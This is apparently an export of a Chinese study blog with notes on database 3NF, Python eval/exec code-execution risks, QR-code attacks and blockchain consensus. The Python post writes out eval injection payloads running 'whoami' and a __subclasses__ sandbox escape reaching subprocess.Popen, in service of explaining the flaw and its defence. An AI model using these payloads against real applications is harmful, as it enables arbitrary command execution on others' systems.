将数据库设计成能够高效的检查约束是很有用的，如果函数依赖的检验仅需要考虑一个关系就可以完成，那么检查这种约束的开销就很低 BCNF的设计不是保持依赖的，由于常常希望保持依赖，因此考虑另外一种比BCNF弱的范式，它允许保持依赖，该范式称为第三范式 第三范式关系模式R属于第三范式（3NF）的条件：对于所有 α → β in F* ，以下至少一项成立： α → β 是一个平凡的函数依赖（β ∈ α ） α 是 R的一个超码 β - α 中的每个属性A都包含于R的一个候选码中（Note：每个属性A可能包含于不同的候选码中） 任何满足BCNF的模式也满足3NF（因为他的每个函数依赖都将满足前两个条件中的一条） 在某种意义上，3NF的第三个条件代表BCNF条件最小放宽，以确保每一个模式都有保持依赖的3NF分解 使用函数依赖进行分解函数依赖理论分解算法使用多值依赖的分解更多的范式数据库设计过程时态数据建模数据存储和数据访问查询处理和查询优化事务管理查询代价 多值依赖 冲突串行化 211.87.227.230:3306 webteach]]></content>
      <categories>
        <category>Database</category>
      </categories>
      <tags>
        <tag>StudyNote</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Functions with potential code execution risks in Python]]></title>
    <url>%2F2019%2F12%2F30%2FFunctions-with-potential-code-execution-risks-in-Python%2F</url>
    <content type="text"><![CDATA[Python中有潜在代码执行风险的函数 参考： Python中有潜在代码执行风险的函数(一) 在Python中一些函数存在着任意代码执行的隐患，错误的使用这些方法将会导致漏洞的产生，攻击者可能会利用这些安全隐患进行攻击。 第一组经典的两个存在执行代码隐患的函数 eval() 和 exec() 在python中，eval和exec 的用法极其相似。eval和exec都可以将传入的字符串执行，但两者又有不同之处 evaleval是一个python内置函数，语法为eval(expression, globals=None,locals=None) eval函数接收三个参数：其中 expression参数是用做运算的字符串类型表达式； globals参数用于指定运行时的全局命名空间； Locals参数用于指定运行时的局部命名空间。 globals与 locals 是可选参数，默认值是 None，他们只在运算时起作用，运算后则销毁。 exec在Python2中exec是一个内置语句(statement)而不是一个函数，但是到了Python3中exec将Python2中作为内置语句的exec和execfile()函数功能整合到一起，成为了一个新的函数，语法为exec(object[, globals[,locals]]) exec的第一个参数可以是code object，因此它可以执行复杂的代码逻辑，例如变量赋值操作等，这一点是eval做不到的。但exec返回值永远为 None，因此exec不能像eval一样将计算结果返回。exec的后两个参数与eval一致。（所以eval通常可以当作是一个计算器，计算一串字符的值） 对比： 在执行python语句上不同 exec()可以对变量a进行赋值，而eval()并不能对a进行赋值 exec()可以执行python的import os，而eval()不能直接执行python语句，但是可以执行表达式&#39;__import__(&quot;os&quot;)&#39;并返回结果 __import__()函数用于动态加载类和函数，可以将该引入模块作为一个动态对象使用 相较于exec： 返回值不同 由图可见，eval在对表达式进行计算后，返回计算结果，而exec并无返回结果 虽然有种种不同，但是还是会将第一个传入参数进行执行 存在的安全隐患以eval()函数为例，下图中的add函数使用eval()对传入参数进行处理，将传入的a，b拼接起来通过eval()计算返回结果 12def add(a, b):4return eval("%s + %s" % (a, b)) 通过eval进行执行表达式 123add("__import__('os').system('whoami')", 2)eval("__import__('os').system('whoami')")add("__import__('os').system('whoami') #", 2) 成功执行命令，并返回结果2。 返回结果0是因为os.system()执行成功的话，返回值为0。 如同sql注入一样的思路，在执行语句后面加上注释，即可返回结果0。 防范通过上面可知，只要eval或exec中的传入变量可控，就存在执行系统命令的问题 针对上面的例子eval(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)的问题，存在一种常见的限制方法：即指定eval()或exec()的globals参数为{&#39;builtins&#39;:None}或者{&#39;builtins&#39;:{}}这样的形式就可以避免任意代码执行的隐患。这种方法实际上是限制了他们可用的python内置模块(builtins) 在eval()和exec() ，globals参数用于指定运行时的全局命名空间，如果globals没有被提供，则使用python的全局命名空间 如上图，若不规定globals参数，则使用python全局的a=1，若提供了globals参数{&#39;a&#39;:6}，则使用globals参数里的数据，即eval的作用域就是{&#39;a&#39;:6} 而且当eval使用了自己作用域里的参数，就不会使用python的全局命名空间 python的builtins模块builtins模块是提供对python的所有“内建”标识符的直接访问功能。python解释器在加载时会首先加载内建名称空间并自动导入所对应的内建函数，在执行python的时候加上-v的选择就可以看到加载过程。 python源码分析——内建模块builtins初始化 而且由于builtins的存在，使得在Python可以直接使用一些内建函数而不用显式的导入它们，例如input()、list()、import 等 通过命令dir(__builtins__)就可以看到所有的内建函数 在python中使用上述函数都可以不用导入模块 回到exec/eval问题中，值得注意的是，在exec/eval中，若globals参数被提供，但是没有提供自定义的builtins，那么exec/eval会将当前环境中的builtins拷贝至自己提供的globals里，例子如下图： 如图，若globals里不规定__builtins__，则会使用python全局的builtins，例如in[25]。如果定义了builtins，则会使用已经定义的builtins，如in[27]和in[28]。 这里我没搞懂26为什么也可以，因为builtins在python3.x的时候已经和builtin合并了。 后面实验时发现，builtins可以被当作模块所import，所以推测python初始化的时候使用的是__builtins__，实验证明这是正确的 exec的globals策略与eval相同 因此可以通过指定globals参数，来控制eval运行执行的内置函数。这个方法看起来很有效的限制eval/exec对import等内置函数的使用，似乎可以防止任意代码执行。但是此方法仍然存在绕过 绕过在上述防范中，通过globals参数对builtins中的内置函数范围进行限制，使得eval/exec无法随意使用”import”等内置函数来达成阻止任意代码执行 但是却存在如下绕过：(1, 2).class.bases[0].subclasses 如图，(1,2)是一个元组，__class__用于查看对象所在的类，很显然(1,2)是个元组类型的对象，即tuple类 __bases__属性返回所有直接父类所组成的元组（直接父类是因为python的多继承属性所导致） 如In[36]可见元组类型的直接父类是object类 __subclasses__ 可用来获取类的所有子类，贼恐怖 因为(1,2).__class__.__bases__[0]已经是object类了，而object类的子类众多，因此可以使用的类就非常丰富了 比如list就在object类里，对应着(1,2).__class__.__bases__[0].__subclasses__()[7] 这样就可以调用list函数，将其转为一个list 构造利用链的核心方法就是：只要追溯到object类并使用subclasses()使用object子类即可 在object子类中，有执行系统命令的子类 subprocess.Popen subprocess 模块允许你生成新的进程，连接它们的输入、输出、错误管道，并且获取它们的返回码。 subprocess.Popen(args, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE,stdout=subprocess.PIPE) args被用作启动进程的参数. 可能是一个列表或字符串. shell（默认为 False）指定是否使用 shell 执行程序。如果 shell 为 True，更推荐将 args 作为字符串传递而非序列。 stdout从子进程捕获到的标准输出. 一个字节序列, 或一个字符串, 如果 run() 是设置了 encoding, errors 或者 text=True 来运行的. 如果未有捕获, 则为 None.如果你通过 stderr=subprocess.STDOUT 运行, 标准输入和标准错误将被组合在一起, 并且 stderr` 将为 None. stderr捕获到的子进程的标准错误. 一个字节序列, 或者一个字符串, 如果 run() 是设置了参数 encoding, errors 或者 text=True 运行的. 如果未有捕获, 则为 None. 简而言之上面代码简而言之就是，接受args的命令，执行成功就将执行成功的结果存入stdout管道，执行失败的结果存入stderr管道。 显然，利用链：().__class__.bases[0].__subclasses__()[176](&quot;whoami&quot;) 可能由于我的引入库不同，导致了subclasses的列表选择不同，我在subclasses[217]找到subprocess.Popen，然后成功执行whoami命令 每个python的运行环境不同，引入库的顺序不同，导致subprocess不一定在176位，甚至可能没有被引入 由图可见，虽然可能没被引入，但是这种方法能成功绕过。可见，虽然限制只允许使用list，但是我们仍然可以执行系统命令。因此，简单的使用{‘builtins‘: None}是无法满足eval的安全需求的 实际上，可以使用ast.literal_eval()来代替eval() ast.literal_eval()允许传入的内容如下 strings, bytes, numbers, tuples, lists, dicts, sets, booleans, None 当不合法的字符传入时，程序则会报错，如下图 使用ast.literal_eval()代替eval和exec，可以有效的防止任意代码执行漏洞 甚至只要有任何不合法的字符传入，程序就会报错 使用ast.literal_eval()代替eval和exec，可以有效的防止任意代码执行漏洞 扩展： python沙箱逃逸]]></content>
  </entry>
  <entry>
    <title><![CDATA[QRCodeAttack]]></title>
    <url>%2F2019%2F12%2F30%2FQRCodeAttack%2F</url>
    <content type="text"><![CDATA[关于python的QRCode的用法qrcode的用法 https://blog.csdn.net/cungudafa/article/details/85871871 利用zxing模块读二维码数据 12345678910111213141516171819202122232425262728293031323334from PIL import Imageimport qrcodeimport osimport zxingdef make_qrcode(data): img = qrcode.make(data) img.sava("test.png") im = Image.open("test.png") im.show()def read_qrcode_zxing(filename): ''' logger = logging.getLogger(__name__) if not logger.handlers: logging.basicConfig(level=logging.INFO) DEBUG = (logging.getLevelName(logger.getEffectiveLevel()) == 'DEBUG') ''' img = Image.open(filename) ran = int(random.random() * 100000) img.save('%s%s.jpg' % (os.path.basename(filename).split('.')[0], ran)) zx = zxing.BarCodeReader()#调用zxing二维码读取包 data = '' zxdata = zx.decode('%s%s.jpg' % (os.path.basename(filename).split('.')[0], ran))#图片解码 # 删除临时文件 os.remove('%s%s.jpg' % (os.path.basename(filename).split('.')[0], ran)) if zxdata: logger.debug(u'zxing识别二维码:%s,内容: %s' % (filename, zxdata)) data = zxdata else: logger.error(u'识别zxing二维码出错:%s' % (filename)) img.save('%s-zxing.jpg' % filename) return data 但是，这只能识别标准的二维码，并不能识别图片中的二维码，由于这里需要用到tesseract，因此直接用二维码软件进行扫（注意不能用微信支付宝之类的，因为碰到url此类软件会直接跳转，好像QQ和一些第三方的扫码软件不会直接跳转url，而是显示其数据） 乌云的二维码攻击 QR二维码的攻击方法与防御 网络钓鱼 诱导下载、传播恶意软件 隐私泄露 防御方式 QR码解码译码过程加入加解密环节 第三方统一管理 思考1.加入加解密环节：这只是确保了原二维码的数据的完整性，隐匿性，并不能确保其不被中间人攻击，即直接替换二维码的行为 现有共享单车扫码探索12345678910111213Mobike:48650262688: http://www.mobike.com/download/app.html?b=8650262688_148641170177: http://www.mobike.com/download/app.html?b=8641170177_148641176319: http://www.mobike.com/download/app.html?b=8641176319_14hello bike:43110469617: http://c3x.me/?n=311046961743110457021: http://c3x.me/?n=311045702145610663692: http://c3x.me/?n=56106636924didi bike:4https://dc.tt/htw?id=1B24C1D&amp;p=24https://dc.tt/htw?id=1B4910D&amp;p=2 用电脑直接访问该网址 Mobike是直接跳转到app推荐页面，打开下载，是腾讯合作方的应用宝下载 hello bike也是直接跳转至app推荐页面，打开下载，属于hellobike自己搭建的下载页面 滴滴是跳转到小程序推荐页面， hello 由图可见，明显的一个env变量，推测是用来判断用的。 然后下面就是对enc进行逻辑判断，然后处理跳转 我的浏览器是跳转到了http://c3x.me/bike.html?n=3110469617 https://c3x.me/wechat-ebike.html?n=3110469617是对微信内置浏览器做的一些页面自适应 再次应该是对User-Agent进行判断，并跳转至相应页面，代码如下： 12345// 基本环境及参数 var ua = window.navigator.userAgent; var params = &#123;&#125;; if (location.search) &#123; var parts = location.search.substring(1).split('&amp;'); 关于window.navigator.userAgent：https://blog.csdn.net/liangyihe/article/details/78464656 以下是苹果的useragent，用去替换 1UserAgent:Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1 果然是同一个页面的不同适应性处理 对于aliBrowser，是对应跳转到相应的下载界面，采用alipays://plat.... 对于哈喽bike App也是跳转到自身的路由，然后再其服务端做处理 Mobike抓包访问，发现是直接301了（永久性转移），然后没找到解决办法 因为是直接跳转至下载界面，所有没有和此单车合作的app都是跳转至下载界面，抓包失败 didi12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849this.config 0 &#123;…&#125;__method__: "POST"_source: "https://page.xiaojukeji.com/m/hellopage.html?id=1B24C1D&amp;p=2"api_version: "1.0.1"app_version: "1.8.7"appid: 30004auto_fill_phone: truecanonical_country_code: "CN"checkPhone: truecity_id: 0country_calling_code: "+86"country_filter: Array []country_id: 156from: "webapp"imei: ""lang: "zh-CN"law_checked: falseorigin_id: "1"role: 1scene: 3showCodeSign: falsestyleObj: Object &#123; &#125;useOauthCode: false&lt;prototype&gt;: Object &#123; … &#125;login.min.js:1:36888 明显的一个post请求，而且采用了https，不好抓包 但是预测是跳转至小程序，属于微信小程序的。 手机抓包工具：fiddler，frida 通过以上可发现，共享单车的二维码大多都是通过二维码的url格式存储，然后通过url访问判断其user-Agent推测出使用的浏览器，然后做不同的路由处理或使用自身协议，如alipays:// 关于密码学与二维码的思考在二维码多存入证书，存储的数据量应该会变大，但是不至于存不下，但是这是没有必要的。 当扫完二维码访问其指向的url时，该请求已向ocsp请求在线证书了；而且该种方法也无法避免中间人攻击。（参考https的ssl中间人攻击） https中的ssl中间人攻击 通过伪造CA证书，实现SSL中间人攻击 SSL,TLS中间人攻击 HTTPS中间人攻击实践（原理·实践） 至于二维码替换更加无可避免，因此还是采用信任可信第三方的(官方app，以及有合作的app)方法比较安全。（因为其用的是路由判断，不存在假的url能跳转） 其次，假如在二维码中加入hash判断，也是不可行的。因为密码学不能依赖于不公开的算法，而且可以通过暴力匹配算出hash算法的流程。因此得知流程，将假url和假url的hash一起替换原url以及其hash便可产生攻击。]]></content>
      <categories>
        <category>QRCode</category>
      </categories>
      <tags>
        <tag>QRCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BlockChain]]></title>
    <url>%2F2019%2F12%2F26%2FBlockChain%2F</url>
    <content type="text"><![CDATA[Bitcoin数字货币和纸质货币的对比 属性 分析 优势方 便携 大部分场景（特别是较大数额支付时）下数字货币将具备更好的便携性 数字货币 防伪 两者各有千秋，但数字货币整体上会略胜一筹。 纸币依靠的是各种设计（纸张、油墨 、防伪 暗纹 、 夹层等）上的精巧，数字货币依靠的则是密码学上的保障。 事实上，纸币的伪造时有发生，但数字货币的伪造目前还无法实现 数字货币 辨伪 纸币即使依托验钞机等专用设备仍会有误判情况，数字货币依靠密码学易于校验 数字货币 匿名 通常情况下，两者都能提供很好的匿名性 。 但都无法防御有意的追踪 持平 交易 对纸币来说，谁持有纸币谁就是合法拥有者，交易通过纸币自身的转移即可完成，无法复制 。 对数字货币来说则复杂得多，因为任何数字物品都是可以被复制的，但数字 形式也意味着转移成本会更低 。 总体上看，两者适用不同的情景 持平 资源 通常情况下，纸币的生产成本要远低于面额。 数字货币消耗资源的计算则复杂得多 。 以比特币为例，最坏情况下可能需要消耗接近甚至超过面值的电能 持平 发行 纸币的发行需要第三方机构的参与，数字货币则通过分布式算法来完成发行。 在人类历史上，通胀和通缩往往是不合理地发行货币造成的，而数字货币尚缺乏大规模验证， 还有待观察 持平 管理 纸币发行和回收往往通过统一机构，易于监管和审计；目前出现的数字货币在这方面 还缺乏足够支持和验证 纸币 双重支付攻击对于数字货币来说，数字化内容容易被复制。数字货币持有人可以将同一份货币发给多个接收者，这种攻击称为“双重支付攻击”。 数字货币1.0：即银行中通过电子账号里面的数字记录了客户的资产 但他依赖于一个前提：假定存在一个安全可靠的第三方记账机构负责记账，这个机构负责所有的担保环节，最终完成交易。 银行、支付宝都属于这种类型。 去中心化的技术难关 货币的防伪：谁负责对货币的真伪进行鉴定 货币的交易：如何确保货币从一方安全转移到另外一方 避免双重支付：如何避免同一份货币支付给多个接收者 数字货币的定义数字货币可以认为是一种基于节点网络和数字加密算法的虚拟货币。数字货币的核心特征主要体现在三个方面： ①由于来自于某些开放的算法，数字货币没有发行主体，因此没有任何人或机构能够控制它的发行； ②由于算法解的数量确定，所以数字货币的总量固定，这从根本上消除了虚拟货币滥发导致的可能； ③由于交易过程需要网络中的各个节点的认可，因此数字货币的交易过程足够安全 。 数字货币是一种不受管制的、数字化的货币，通常由开发者发行和管理，被特定虚拟社区的成员所接受和使用。欧洲银行业管理局将虚拟货币定义为：价值的数字化表示，不由央行或当局发行，也不与法币挂钩，但由于被公众所接受，所以可作为支付手段，也可以电子形式转移、存储或交易 比特币的诞生2008 年 10 月 31 日， 一位化名 Satoshi Nakamoto （中本聪）的人在 metzdowd 密码学邮件列表中提出了比特币（ Bitcoin）的设计白皮书《 Bitcoin: A Peer-to-Peer Electronic Cash System 》，并在2009 年公开了最初的实现代码 。 比特币的意义和价值比特币首次真正从实践意义上实现了安全可靠的去中心化数字货币机制 ，这也是它受到无数金融科技从业者热捧的根本原因 。 作为一种概念货币，比特币主要希望解决已有货币系统面临的几个核心问题： 被掌控在单一机构手中，容易被攻击 自身的价值无法保证，容易出现波动 无法匿名化交易，不够隐私 比特币的生态系统如下： 区块链因比特币而生，但是现在已经脱离了比特币网络自身。 Block Chain区块链本质上是一个去中心化的数据库，又不仅仅是一个数据库。是一串使用密码学方法相关联产生的数据块，每一个数据块中包含了一组比特币网络交易的信息，用于验证其信息的有效性(防伪)和生成下一个区块。 2015年被业界视为区块链元年，2016年则是区块链产业深化发展和全面加速前行的一年，2019年为“上链元年”。 区块链的特点 分布式容错性：分布式网络及其鲁棒，能够容忍部分节点的异常状态 不可篡改性：一致提交后的数据会一直存在，不可销毁和修改 隐私保护性：密码学保证了数据隐私，即便数据泄露也无法解析 随之带来的业务特性 可信任性：区块链技术可以提供天然可信的分布式账本平台，不需要额外的第三方中介机构参与 降低成本：跟传统技术相比，区块链技术可能需要时间、人力和维护成本更少 增强安全：区块链技术将有利于安全、可靠的审计管理和账目清算，减少犯罪风险 所有跟信息、价值、信用等相关的交换过程，都将可能从区块链技术中得到启发或直接受益。 Wikipedia的定义：是借由密码学串接并保护内容的串连文字记录。类比于一种分布式数据库技术，通过维护数据块的链式结构，可以维持持续增长的、不可篡改的数据记录。 区块链技术最早的应用出现在比特币项目中。 基本概念： 交易（transaction）：一次对账本的操作，导致账本状态的一次改变，如添加一条转账记录 区块（block）：记录一段时间内发生的所有交易和状态结果，是对当前账本状态的一次共识 链（chain）：由区块按照发生顺序串联而成，是整个账本状态变化的日志记录 若把区块链作为一个状态机，则每一次交易是视图改变一次状态，而每次共识生成的区块，就是参与者对于区块中交易导致状态的改变的结果进行确认。 在实现上，首先假设存在一个分布式的数据记录账本，这个账本只允许添加 、 不允许删除 。 账本底层的基本结构是一个线性的链表，这也是其名字“区块链”的来源 。 链表由一个个“区块”串联组成，后继区块记录前导区块的哈希值（ pre hash ） 。 新的数据要加入，必须放到一个新的区块中 。 而这个块（以及块里的交易）是否合法，可以通过计算哈希值的方式快速检验出来 。 任意维护节点都可以提议一个新的合法区块，然而必须经过一定的共识机制来对最终选择的区块达成一致。 比特币为例，区块链的共组过程 比特币客户端发起一项交易，广播到比特币网络中并等待确认 。 网络中的节点会将一些收到的等待确认的交易记录打包在一起（此外还要包括前一个区块头部的哈希值等信息），组成一个候选区块 。 试图找到一随机串放到区块里，使得候选区块的哈希结果满足一定条件（比如小于某个值） 。 这个 nonce 串的查找需要一定的时间去进行计算尝试。 一旦节点算出来满足条件的 nonce 串，这个区块在格式上就被认为是“合法”了，就可以尝试在网络中将它广播出去 。 其他节点收到候选区块，进行验证，发现确实符合约定条件了，就承认这个区块是一个合法的新区块，并添加到自己维护的区块链上 。 当大部分节点都将区块添加到自己维护的区块链结构上时，该区块被网络接受，区块中所包括的交易也就得到确认 。 如图，A想要向B发起交易（1，2），做工作量证明，然后将交易广播至区块链网络中（3），让其他节点验证工作量证明（4），验证成功后，将交易区块加入该链的末尾（5），交易成功（6）。 工作量证明Proof of Work：简称PoW，即工作量证明。比特币的这种基于算力寻找 nonce 串的共识机制。 目前，要让哈希结果满足一定条件，并无已知的快速启发式算法，只能进行尝试性的暴力计算 。 尝试的次数越多（工作量越大），算出来的概率越大 。 通过调节对哈希结果的限制，比特币网络控制平均约 10 分钟产生一个合法区块 。 算出区块的节点将得到区块中所有交易的管理费和协议固定发放的奖励费（目前是 12.5 比特币，每四年减半），这个计算新区块的过程俗称为挖矿 。 比特币网络中存在大量（据估计数千个）的维护节点，而且大部分节点都是正常工作的，默认都只承认所看到的最长的链结构 。 只要网络中不存在超过一半的节点提前勾结一起采取恶意行动，则最长的链将很大概率上成为最终合法的链 。 而且随着时间增加，这个概率会越来越大。 例如，经过 6 个区块生成后，即便有一半的节点联合起来想颠覆被的结果，其概率也仅为（1/2)6 = 1.6% ，即低于 1 /60 的可能性 。当然，如果整个网络中大多数的节点都联合起来作恶，可以导致整个系统无法正常工作 。 要做到这一点，往往意味着付出很大的代价，跟通过作恶得到的收益相比，得不偿失 。 区块链的演化 区块链1.0 ​ 区块链1.0是随着比特币的发明而引入，基于用于加密货币 区块链2.0 ​ 主要用于金融服务，在这一阶段引入合同 区块链3.0 ​ 用于金融服务行业之外，同时还包括政府、卫生、媒体、艺术和司法等更综合的行业 Generation X（区块链X） ​ 这是区块链发展过程中一个奇点，有一天我们将会拥有一个公共区块链服务，任何人都可以使用，进而在所有领域提供服务 三种典型演化场景 场景 功能 智能合约 一致性 权限 类型 性能 编程语言 代表 公信的数字货币 记账功能 不带有或较弱 Pow 无 公有链 较低 简单脚本 比特币网络 公信的交易处理 智能合约 图灵完备 PoW、PoS 无 公有链 受限 待定语言 以太坊网络 带权限的分布式账本处理 商业处理 多种语言、图灵完备 包CFT、BFT在内的多种机制、可插拔 支持 联盟链 可扩展 高级编程语言 超级账本 演化出的几种类型： 公有区块链：对公众开放，任何人都可以作为节点参与进来。任何人不会持有该账本，而且向任何参与者开放 私有区块链：仅向特定组织开放，进而确定账本的共享过程 半私有区块链：兼具私有性和公有性，私有部分由某一团体控制，而公有部分则向参与者开放 侧链技术：包括单路楔入式侧链和双路楔入式侧链。针对后者，货币可在主链和侧链间移动，并在必要时返回至主链 许可账本：参与者是已知且受信的，许可账本不需要使用分布式协商一致机制，相反，可以使用一致性协议来维护共享账本 分布式账本：分布式账本分布在参与者之间，并扩散于多个站点或组织中。对应的记录是连续存储的，而不是按情况排序的 共享账本：共享的应用程序和数据库 全私有和专有账本：适用于组织内部的特定私有环境共享数据，并提供数据的真实性保证 标记化区块链：标准的区块链，通过挖掘和初始分布来生成加密货币 无代币区块链：不需在节点间传递值，只需在受信各方之间共享数据 区块链是首个自带对账功能的数字记账技术实现 跟传统的记账技术相比，基于区块链的分布式账本应该包括如下特点： 维护一条不断增长的链，只可能添加记录，而发生过的记录都不可篡改 去中心化，或者说多中心化，无需集中控制而能达成共识，实现上尽量采用分布式 通过密码学的机制来确保交易无法被抵赖和破坏，并尽量保护用户信息和记录的隐私性 分类根据参与者的不同，可以分为公开（public）链、联盟（ consortium）链和私有（private）链。 公有链，顾名思义，任何人都可以参与使用和维护，如比特币区块链，信息是完全公开的； 如果进一步引入许可机制，可以实现私有链和联盟链两种类型： 私有链，由集中管理者进行管理限制，只有内部少数人可以使用，信息不公开； 联盟链则介于两者之间，由若干组织一起合作维护一条区块链，该区块链的使用必须是带有权限的限制访问，相关信息会得到保护，如供应链机构或银行联盟 。 分布式系统与去中心化分布式系统 区块链的核心是一个去中心化的分布式系统 分布式系统中的节点可以相互交换信息 节点分为可信节点、缺陷节点、恶意节点。一个由任意行为的节点被称为拜占庭节点，网络上某个出现任何意外行为的节点都可归类于拜占庭节点。 分布式系统的主要挑战：节点与容错的协调，即一个节点的失效不影响整个系统的运行 同步系统：Synchronous System: Known bounds on times for message transmission, processing , bounds on local clock drifts, etc.(Can use timeout) 异步系统：Asynchronous System: No known bounds on times for message transmission, processing, bounds on local clock drifts, etc.(More realistic, practical, but no timeout.) CAP定理cap定理，又称布鲁尔定理：任意分布式系统不能同时拥有一致性、可用性、分区容错性 一致性(Consistency)：任意节点拥有最新数据副本 可用性(Availablitiy)：系统在使用期间可以被访问，接收请求并在必要时做出响应 分区容错性(Partition Tolerance)：一组节点的失效不影响系统的运行 一般是淘宝的系统可用性可以达到5个9，意思是他的可用水平是99.999%，即全年停机时间不超过(1-0.99999)*365*24*60 = 5.256min CP without A ：一旦发生网络故障或者消息丢失等情况，就要牺牲用户的体验，等待所有数据全部一致了之后再让用户访问系统。分布式存储系统(Redis、Hbase),分布式协调组件Zookeeper. AP wihtout C：要高可用并允许分区，则需放弃一致性。一旦网络问题发生，节点之间可能会失去联系。为了保证高可用，需要在用户访问时可以马上得到返回，则每个节点只能用本地数据提供服务，而这样会导致全局数据的不一致性。 淘宝的购物，12306的买票，都是在可用性和一致性之间舍弃了可用性而选择一致性。保证了最终一致性。 然而区块链可以实现这三种属性 通过复制的方式实现容错性 通过一致性算法确保所有节点具有相同的数据 拜占庭将军问题一群领导拜占庭各部军队的陆军将军，计划从某一城市进攻或撤退。这里，将军们之间的唯一沟通方式是信使，他们需要就同时进攻达成一致意见，以赢得胜利。 问题：一名或多名将军或许是叛徒，可以传达一个误导信息。因此，有必要找到一种可行的机制，让将军们之间达成某种协议，这样就可以同时进行攻击。 相较于分布式系统，将军可视作节点，叛国者则视作拜占庭（恶意的）节点，信使是将军之间沟通的渠道。 拜占庭将军失效所谓拜占庭失效指一方向另一方发送消息，另一方没有收到，或者收到了错误的信息的情形。 在容错的分布式计算中，拜占庭失效可以是分布式系统中算法执行过程中的任意一个错误。这些错误被统称为“崩溃失效”和“发送与遗漏式失效”。当拜占庭失效发生时，系统可能会做出任何不可预料的反应。 这些任意的失效可以粗略地分成以下几类： 进行算法的另一步时失效，即崩溃失效； 无法正确执行算法的一个步骤； 执行了任意一个非算法指定的步骤。 各个步骤由各进程执行，算法就是由这些进程执行的。一个错误的进程是在某个点出现了上述情况的进程。没有出现错误的进程是正确的进程。 拜占庭将军问题——解决算法拜占庭问题的最初描述是：n 个将军被分隔在不同的地方，忠诚的将军希望通过某种协议达成某个命令的一致（比如一起进攻或者一起后退）。但其中一些背叛的将军会通过发送错误的消息阻挠忠诚的将军达成命令上的一致。Lamport 证明了在将军总数大于3m ，背叛者为m 或者更少时，忠诚的将军可以达成命令上的一致。 为了保证上面的需求，必须满足下面两个条件： IC1. 所有忠诚的副官遵守相同的命令，即一致性 IC2. 如果发出命令的将军是忠诚的，那么所有忠诚的副官遵守司令（发出命令的将军）的命令，即正确性 特别提示： 发送命令的每次只有一个将军，将其命令发送给n-1 个副官。 m 代表叛国者的个数，因为将军总数为n，所以副官总数为n-1 个。 IC2 中副官遵守实际上是指忠诚的将军能够正确收到忠诚将军的命令消息。 消息传递 通过消息传递达到一致，如果有m 个叛国将军，则将军们的总数必须为3m+1 个以上。下面是消息传递过程中默认的一些条件： A1. 每个被发送的消息都能够被正确的投递 A2. 信息接收者知道是谁发送的消息 A3. 能够知道缺少的消息 A1 和 A2 假设了两个将军之间通信没有干扰，既不会有背叛者阻碍消息的发送（截断）也不会有背叛者伪造消息的情况（伪造）。即是每个将军都可以无误地将自己的消息发送给其他每个将军。 算法 拜占庭将军问题。口头算法OM(n.m);n=3m+1 OM(m)算法： 12345678910111213141516消息算法OM(m) 。对于所有的非负整数m ，每个发令者通过OM(M) 算法发送命令给n-1 个副官。# 将军通过副官传递消息:即, 消息传递路线: 将军i--Message--&gt;副官i --boardcast--&gt;副官j--Message--&gt;将军j（1）发令者将他的命令发送给每个副官。（2）对于每个i ，vi 是每个副官i 从发令者收到的命令，如果没有收到命令则为撤退命令。副官i 在OM(m-1) 中作为发令者将vi 发送给另外n-2 个副官。（3）对于每个i，并且j 不等于 i，vj 是副官i 从第（2）步中的副官j 发送过来的命令（使用 OM(m-1)算法），如果没有收到第（2）步中的副官j 的命令则默认为撤退命令。最后副官i 使用majority(v1,…,vn-1)得到命令。定义majority(cmd1,cmd2,…,cmdn)等于多数派命令。第一轮将军发给所有副官命令第二轮n-1副官互通将军发了什么,确定将军是否为叛徒,若将军是叛徒，则将军的消息无效,舍弃;将军忠诚,即可在第二轮已可决定第三轮n-1副官互通某个副官各给别人发了什么消息,遍历n-2个副官的消息以判断自己作何决定(例:若L1收到其它L2~L6发来的Vj, 但是他要怀疑准确性，比如L1会想L2发给自己是否是正确的呢？那么就进入第三轮进行投票.因此跟在第2轮之后,L1会依次询问L3,4,5,6 ，问他们上一轮L2给他们发了什么,L1得到第二轮中L2-&gt;L3,L2-&gt;L4,L2-&gt;L5,L2-L6,再结合L2-&gt;L1，从5个里用majority函数决定L2发了啥，再依次遍历L3-6,然后L1完成第二轮的确认) 算法证明详细的算法证明可参考： 拜占庭将军百度百科 如何理解拜占庭将军问题 定理1：对于任意m，如果有超过3m 个将军和最多m 个背叛者，算法OM(m) 满足条件IC1 和条件IC2。 引理1：对于任意m 和k ，如果有超过2k+m 个将军和最多k 个背叛者，那么算法OM(m) 满足IC2 （回顾下IC2 指的是，如果将军是忠诚的，所有的副官遵守将军命令）。 签名消息签名消息在除了满足口头消息A1-A3 三点要求外还应该满足下面A4： A4. （a）签名不可被伪造，一旦被篡改即可发现 （b）任何人都可以验证将军签名的可靠性 choice() 来决定副官的选择： 当集合V 只包含了一个元素v ，那么choice(V)=v ； choice(Φ)=RETREAT。 基于签名消息的算法SM(m)算法： 12345678910初始化Vi=空集合（1）将军签署命令并发给每个副官（2）对于每个副官i ：4（A）如果副官i 从发令者收到v:0 的消息，且还没有收到其他命令序列，那么：44（i）使Vi 为&#123;v&#125;44（ii）发送v:0:i 给其他所有副官4（B）如果副官i 收到消息v:0:j1:...:jk 且v 不在集合Vi 中则44（i）添加v 到Vi44（ii）如果k&lt;m ，那么发送v:0:j1:...:jk:i 给每个不在j1,..,jk 中的副官（3）对于每个副官i ，当不再收到消息，则遵守命令choice(Vi) 基于签名消息的算法证明定理2：对于任意m，最多只有m 个背叛者情况下，算法SM(m) 解决拜占庭将军问题。 区块链与分布式系统 区块链的核心是一个点对点的分布式账本，此类账本具有加密安全性，且仅可追加内容，同时不可更改（很难），只有在对等身份成员之间达成共识或协议时才能更新 区块链可以定义为一个平台，在此平台上，对等点可以通过交易交换值，而不需要中央信任仲裁者。 一致性一致性是指不信任节点之间的协议过程。 一致性机制所需满足的需求： 协议：全部可信节点制定同一值 有效性：所有可信节点的商定值必须与至少一个节点所提议的初始值相同 容错性：一致性算法应在能出现故障或恶意节点的情况下运行 完整性：任何节点都不可能做多次决策 一致性机制的类型： 基于拜占庭式的容错：不存在计算密集型操作，依赖于一个简单的、发布签名消息的节点方案 基于领导的一致性机制：节点实现领导选举机制，由获胜节点提供结果值 区块链的一般元素 